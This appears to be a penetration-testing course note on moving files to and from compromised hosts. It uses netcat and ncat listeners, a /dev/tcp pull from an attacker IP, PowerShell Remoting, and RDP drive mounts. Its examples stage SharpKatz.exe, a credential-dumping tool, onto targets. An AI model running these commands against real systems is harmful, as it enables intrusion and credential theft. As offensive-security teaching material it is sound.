# Other File Transfer Methods

## Netcat
```shell
# Listening on target machine 
nc -l -p 8000 > SharpKatz.exe
#If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
ncat -l -p 8000 --recv-only > SharpKatz.exe

#Attack Host - Sending File to Compromised machine
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

#The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

#Attack Host - Sending File as Input to Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

#Machine Connect to Netcat to Receive the File
nc 192.168.49.128 443 > SharpKatz.exe

#Attack Host - Sending File as Input to Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe

#Miscellaneous File Transfer Methods
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

#NetCat - Sending File as Input to Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

#Ncat - Sending File as Input to Netcat
sudo ncat -l -p 443 --send-only < SharpKatz.exe

#Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the Fil
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## Powershell
We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

To create a PowerShell Remoting session on a remote computer, we will need **administrative access**, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.
```shell
#From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
whoami
# htb\administrator

hostname
#DC01

Test-NetConnection -ComputerName DATABASE01 -Port 5985
#ComputerName     : DATABASE01
#RemoteAddress    : 192.168.1.101
#RemotePort       : 5985
#InterfaceAlias   : Ethernet0
#SourceAddress    : 192.168.1.100
#TcpTestSucceeded : True

#Create a PowerShell Remoting Session to DATABASE01
$Session = New-PSSession -ComputerName DATABASE01

#Copy samplefile.txt from our Localhost to the DATABASE01 Session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

#Copy DATABASE.txt from DATABASE01 Session to our Localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP
xfreerdp and rdesktop allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session.
```shell
#Mounting a Linux Folder Using rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

#Mounting a Linux Folder Using xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```